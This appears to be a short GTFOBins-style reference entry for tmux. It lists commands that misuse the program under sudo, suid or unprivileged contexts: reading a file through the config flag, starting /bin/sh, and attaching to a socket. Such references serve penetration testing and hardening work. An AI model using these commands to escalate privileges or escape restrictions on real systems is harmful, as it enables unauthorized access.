title: tmux
html:
tmux

File Read

Context: sudo, suid, unprivileged

tmux -f /path/to/input-file

Shell

Context: sudo, suid, unprivileged

tmux -c /bin/sh

Context: sudo, suid, unprivileged

tmux -S /path/to/socket
